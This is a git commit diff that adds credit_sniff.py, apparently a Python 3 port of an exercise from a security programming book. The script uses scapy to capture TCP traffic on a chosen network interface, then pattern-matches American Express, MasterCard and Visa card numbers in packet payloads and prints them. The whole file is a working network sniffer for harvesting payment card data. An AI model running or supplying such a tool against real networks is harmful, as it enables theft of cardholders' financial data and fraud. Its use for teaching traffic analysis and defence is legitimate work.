a7e23e6adae34bac947b3937652f45bb55ed2bd5
EONRaider <livewire_voodoo@protonmail.com>
2020-06-08 15:32:59 -0300

    Convert to Python 3, refactor and apply PEP 8
    * Optimized imports
    * Refactoring as described in the README.md file under
    "Notes" section

---
+++ chapter05/credit_sniff.py
@@ -0,0 +1,32 @@
+import re
+import argparse
+from scapy.all import sniff, conf
+
+
+def find_credit_card(pkt):
+    raw = pkt.sprintf('%Raw.load%')
+    america_re = re.findall(r'3[47][0-9]{13}', raw)
+    master_re = re.findall(r'5[1-5][0-9]{14}', raw)
+    visa_re = re.findall(r'4[0-9]{12}(?:[0-9]{3})?', raw)
+
+    if america_re:
+        print('[+] Found American Express Card: ' + america_re[0])
+    if master_re:
+        print('[+] Found MasterCard Card: ' + master_re[0])
+    if visa_re:
+        print('[+] Found Visa Card: ' + visa_re[0])
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(
+        usage='python3 credit_sniff.py INTERFACE')
+    parser.add_argument('iface', type=str, metavar='INTERFACE',
+                        help='specify interface to listen on')
+    args = parser.parse_args()
+    conf.iface = args.iface
+
+    try:
+        print('[*] Starting Credit Card Sniffer.')
+        sniff(filter='tcp', prn=find_credit_card, store=0)
+    except KeyboardInterrupt:
+        exit(0)
